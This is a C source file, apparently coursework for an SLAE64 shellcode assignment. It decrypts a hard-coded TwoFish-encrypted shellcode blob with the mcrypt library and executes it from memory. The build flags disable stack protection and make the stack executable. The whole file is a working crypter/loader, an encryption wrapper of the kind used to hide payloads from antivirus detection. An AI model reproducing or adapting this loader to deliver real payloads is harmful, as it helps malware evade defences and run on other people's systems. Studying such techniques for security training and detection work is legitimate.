/*
  Author: Guillem Alminyana
  StudentID:  PA-14628
  SLAE64 Assignment #7: Crypter
  =====================================

This piece of code decrypts a shellcode string using TwoFish and then executes it. 
This is done by using the mcrypt library (apt-get install libmcrypt-dev).

Global vars:

    unsigned char code[] -> string with the shellcode
    char password[]      -> Password used for encryption
    unsigned char IV     -> IVs used by TwoFish in the process

NOTE: password and IV must be initialized with the values of the Crypter.
      Values been printed in the screen

Compile using gcc: 

  gcc -L/usr/include -lmcrypt -fno-stack-protector -z execstack TwoFish_Decrypter.c -o TwoFish_Decrypter

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mcrypt.h>

/*
  TwoFish needed setups
*/

#define IV_SIZE 16
unsigned char password[] = "12345678";
unsigned char IV[IV_SIZE] = \
"\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01";

/*
  ShellCode to decrypt
*/
unsigned char code[]= \
"\xa7\x13\xb7\x5f\x58\x49\x33\x89\xec\xbb\x27\x0d\xb0\xb7\xdb\x09"
"\x7d\x12\x23\xd2\xa8\x2e\x73\x76\x99\x52\xb3\x0c\x10\xd1\x23\xab";

int main (void)
{

	MCRYPT id_crypt;
	int code_length = strlen(code);

	/* Print the Crypted Shellcode */
	printf("\nCrypted Shellcode (%d bytes):\n", code_length);   
	for (int i = 0; i < code_length-1; i++)
	{
		printf("0x%02x,", code[i]);
	}
	printf("0x%02x", code[code_length-1]);	// Remove last ","

	/* MCrypt TwoFish Initialization */
	id_crypt = mcrypt_module_open("twofish", NULL, "cfb", NULL);

	/* IV initialization */
	printf("\n\nTwoFish IV value: ");
	int iv_size = mcrypt_enc_get_iv_size(id_crypt);
	for (int i = 0; i < iv_size-1; i++)
	{
		printf("0x%02x,", IV[i]);
	}
	printf("0x%02x", IV[iv_size-1]);	// Remove ","

	/* Print Password used for crypting */
	printf("\nTwoFish Password Used: %s", password);

	/* Initialize the encryption process with the pass and IV */
	int x = mcrypt_generic_init(id_crypt, password, 16, IV);
	if (x < 0)		// Error Handling
	{
		mcrypt_perror(x);
		printf("\n!! ERROR: %d !!", x);
		return MCRYPT_FAILED;
	}

	/* Decryption of the code[] string */
	x = mdecrypt_generic(id_crypt, code, code_length);
	if ( x < 0)		// Error Handling
	{
		mcrypt_perror(x);
		printf("\n!! ERROR: %d !!", x);
		return MCRYPT_FAILED;
	}

	/* Print the decrypted shellcode */
	printf("\n\nDeCrypted Shellcode:\n\n  ASM Format: \n");

		/* First printed in ASM format */
	for (int i = 0; i < code_length-1; i++)
	{
		printf("0x%02x,", code[i]);
	}
	printf("0x%02x", code[code_length-1]);	// Remove ","

		/* Now printed in C format */
	printf("\n\n  C Format: \n");
	for (int i = 0; i < code_length-1; i++)
	{
		printf("\\x%02x,", code[i]);
	}
	printf("\\x%02x", code[code_length-1]);

	/* End mcrypt */
	mcrypt_generic_end(id_crypt);


	printf("\nDecrypted. Running Shellcode...\n\n");

	/* Lets run the shellcode */
	int (*ret)() = (int(*)())code;
	ret();
	
}	

